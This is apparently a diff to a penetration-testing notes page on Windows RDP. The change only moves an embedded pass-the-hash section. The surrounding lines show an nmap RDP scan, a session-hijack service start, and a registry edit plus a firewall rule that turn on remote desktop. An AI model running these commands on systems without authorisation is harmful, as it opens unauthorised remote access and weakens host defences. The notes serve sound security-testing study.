@@ -8,8 +8,6 @@ title = "Win: RDP"
 
 Also called "Terminal Services".
 
-{{< embed-section page="Docs/6 - Post-Exploitation/pass-the-hash" header="rdp-restricted-admin-mode" title="RDP via Pass the Hash" >}}
-
 ```bash
 # Enum via nmap
 sudo nmap -sV -sC --script 'rdp*' -p3389 <TARGET>
@@ -36,3 +34,5 @@ net.exe start sessionhijack
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
 netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 ```
+
+{{< embed-section page="Docs/6 - Post-Exploitation/pass-the-hash" header="rdp-restricted-admin-mode" title="RDP via Pass the Hash" >}}
